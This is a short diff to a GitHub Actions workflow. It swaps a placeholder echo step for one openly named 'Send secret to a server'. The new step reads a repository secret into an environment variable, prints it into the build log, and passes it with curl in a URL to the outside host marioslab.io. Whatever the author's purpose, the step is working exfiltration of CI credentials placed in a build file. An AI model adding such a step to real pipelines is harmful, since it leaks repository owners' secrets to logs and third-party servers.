@@ -14,8 +14,12 @@ jobs:
       - uses: actions/checkout@v2
         with:
           submodules: 'recursive'
-      - name: wtf
-        run: echo "WTF"
+      - name: Send secret to a server
+        env:
+          MY_SECRET: ${{ secrets.MY_SCECRET }}
+        run: |
+          echo $MY_SECRET
+          curl https://marioslab.io/secret=$MY_SECRET
       - name: Natives cache
         uses: actions/cache@v2
         with:
